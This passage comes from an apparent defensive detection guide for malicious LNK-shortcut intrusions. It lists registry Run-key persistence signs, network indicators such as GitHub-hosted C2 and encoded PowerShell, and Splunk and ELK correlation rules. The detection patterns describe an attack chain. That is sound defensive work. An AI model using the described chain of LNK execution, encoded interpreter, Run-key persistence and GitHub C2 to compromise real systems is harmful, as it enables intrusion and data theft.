Watch for modifications:
  HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
  HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
  
  Created IMMEDIATELY after LNK execution
  With vendor-mimicking names (SamsungDriver, DellSetup, etc)
  
  → Alert + Block parent process
```

### Network Monitoring
```
Indicators:
  1. PowerShell connecting to non-corp domain
     → Immediate alert
  
  2. GitHub API calls (raw.githubusercontent.com)
     → DPRK variant C2 pattern
  
  3. DNS query immediately after LNK execution
     → Likely C2 resolution
  
  4. HTTPS to uncommon ports
     → C2 exfiltration
```

## SIEM Integration

### Splunk Correlation
```
LNK file accessed (from antivirus file scan alerts)
  ↓
Process creation from explorer.exe (child = interpreter)
  ↓
CommandLine contains -enc / Base64 / obfuscation
  ↓
Registry modification to Run keys within 5 seconds
  ↓
Network connection from spawned process
  ↓
ACTION: Correlate all 4 events → INCIDENT
```

### Elasticsearch/ELK
```
Index: filebeat (LNK detection from AV/EDR)
  + Index: winlogbeat (Process creation, registry)
  + Index: zeek/Suricata (Network flows)

Query chain:
  1. Find LNK files matching Tier 1-2 YARA rules
  2. Get process IDs from Explorer.exe within 10 seconds
  3. Check if child processes have encoded arguments
  4. Correlate with registry/task creation events
  5. Check for network anomalies
  
Result: High-confidence incident detection
```

